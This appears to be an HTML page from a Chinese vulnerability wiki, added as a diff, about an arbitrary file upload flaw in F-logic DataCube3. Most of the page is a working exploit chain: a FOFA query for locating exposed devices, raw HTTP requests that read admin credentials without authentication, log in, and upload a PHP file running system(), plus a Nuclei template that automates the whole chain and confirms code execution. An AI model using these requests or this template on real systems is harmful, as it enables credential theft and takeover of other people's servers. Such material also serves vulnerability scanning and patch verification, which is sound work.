@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F-logic-DataCube3/F-logic_DataCube3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>F logic DataCube3存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "F-logic_DataCube3\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "\u672a\u6388\u6743\u83b7\u53d6\u767b\u5f55\u8d26\u53f7\u5bc6\u7801poc", url: "#poc", children: [
+          ]},
+          {title: "\u901a\u8fc7\u83b7\u53d6\u7684\u8d26\u53f7\u5bc6\u7801\u83b7\u53d6COOKIE", url: "#cookie", children: [
+          ]},
+          {title: "\u4f7f\u7528\u83b7\u53d6\u5230\u7684cookie\u83b7\u53d6accesstime\u503c", url: "#cookieaccesstime", children: [
+          ]},
+          {title: "\u4e0a\u4f20\u6587\u4ef6", url: "#_1", children: [
+          ]},
+          {title: "Nuclei-POC", url: "#nuclei-poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../F5%20BIG-IP/%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../F5%20BIG-IP/%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-link">
+        (CVE-2021-22986) F5 BIG-IP iControl RCE
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../F-logic_DataCube3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-31750%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../F-logic_DataCube3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-31750%29/" class="btn btn-xs btn-link">
+        F logic DataCube3存在SQL注入漏洞(CVE 2024 31750)
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="f-logic_datacube3">F-logic_DataCube3存在任意文件上传漏洞<a class="headerlink" href="#f-logic_datacube3" title="Permanent link">&para;</a></h2>
+<p>F-logic DataCube3 /admin/setting_photo.php接口处存在任意文件上传漏洞，恶意攻击者可通过该漏洞在服务器端写入后门，获取服务器权限，进而控制整个web服务器。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title==&quot;DataCube3&quot;
+</code></pre></div>
+<h2 id="poc">未授权获取登录账号密码poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>GET /admin/config_all.php HTTP/1.1
+Host: your-ip
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</code></pre></div>
+<h2 id="cookie">通过获取的账号密码获取COOKIE<a class="headerlink" href="#cookie" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST /admin/config_all.php HTTP/1.1
+Host: your-ip
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+
+user_id=用户名&amp;user_pw=密码&amp;login=%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3
+</code></pre></div>
+<h2 id="cookieaccesstime">使用获取到的cookie获取accesstime值<a class="headerlink" href="#cookieaccesstime" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>GET /admin/setting_photo.php HTTP/1.1
+Host: your-ip
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: 登录后的cookie
+</code></pre></div>
+<h2 id="_1">上传文件<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /admin/setting_photo.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
+Cookie: 登录后的cookie
+
+-----------------------------113389720123090127612523184396
+Content-Disposition: form-data; name=&quot;add&quot;
+
+.............................
+-----------------------------113389720123090127612523184396
+Content-Disposition: form-data; name=&quot;addPhoto&quot;; filename=&quot;ppp.php&quot;
+Content-Type: image/jpeg
+
+&lt;?php system(&quot;echo 123456&quot;);?&gt;
+-----------------------------113389720123090127612523184396
+Content-Disposition: form-data; name=&quot;accesstime&quot;
+
+accesstime
+-----------------------------113389720123090127612523184396--
+</code></pre></div>
+<img alt="81ef3be26a9c8e7345c3dadbee961d57" src="https://github.com/wy876/POC/assets/139549762/70ac5fd6-cb31-46ff-a5d1-c68c18efb006" /></p>
+<h2 id="nuclei-poc">Nuclei-POC<a class="headerlink" href="#nuclei-poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: F-logic-DataCube3-uploadfile
+
+info:
+  name: F-logic DataCube3 /admin/setting_photo.php接口处存在任意任意文件上传漏洞，恶意攻击者可通过该漏洞在服务器端写入后门，获取服务器权限，进而控制整个web服务器。
+  author: WLF
+  severity: high
+  metadata: 
+    fofa-query: title==&quot;DataCube3&quot;
+variables:
+  filename: &quot;{{to_lower(rand_base(10))}}&quot;
+  boundary: &quot;{{to_lower(rand_base(20))}}&quot;
+http:
+  - raw:
+      - |
+        GET /admin/config_all.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+      - |
+        POST /admin/config_all.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        user_id={{path1}}&amp;user_pw={{path}}&amp;login=%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3
+
+
+      - |
+        GET /admin/setting_photo.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+      - | 
+        POST /admin/setting_photo.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
+
+
+        -----------------------------113389720123090127612523184396
+        Content-Disposition: form-data; name=&quot;add&quot;
+
+        .............................
+        -----------------------------113389720123090127612523184396
+        Content-Disposition: form-data; name=&quot;addPhoto&quot;; filename=&quot;{{filename}}.php&quot;
+        Content-Type: image/jpeg
+
+         &lt;?php echo md5(&#39;666&#39;);unlink(__FILE__);?&gt;
+        -----------------------------113389720123090127612523184396
+        Content-Disposition: form-data; name=&quot;accesstime&quot;
+
+        0.{{path2}}
+        -----------------------------113389720123090127612523184396--
+
+      - |
+        GET /images/slideshow/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+
+      - |
+
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        regex:
+           - &#39;&quot;login.root_pwd&quot;,&quot;value&quot;:&quot;(\w*-\w*)&quot;&#39;
+        internal: true
+
+      - type: regex
+        name: path1
+        group: 1
+        regex:
+           - &#39;&quot;login.root_id&quot;,&quot;value&quot;:&quot;(\w*)&quot;&#39;
+        internal: true
+
+      - type: regex
+        name: path2
+        group: 1
+        regex:
+           - &#39;name=&quot;accesstime&quot; value=&quot;0.(\w*\ (\w*))&quot;&#39;
+        internal: true
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 &amp;&amp; contains_all(body,&quot;fae0b27c451c728867a567e8c1bb4e53&quot;)
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../F5%20BIG-IP/%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../F5%20BIG-IP/%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-link">
+        (CVE-2021-22986) F5 BIG-IP iControl RCE
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../F-logic_DataCube3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-31750%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../F-logic_DataCube3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-31750%29/" class="btn btn-xs btn-link">
+        F logic DataCube3存在SQL注入漏洞(CVE 2024 31750)
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
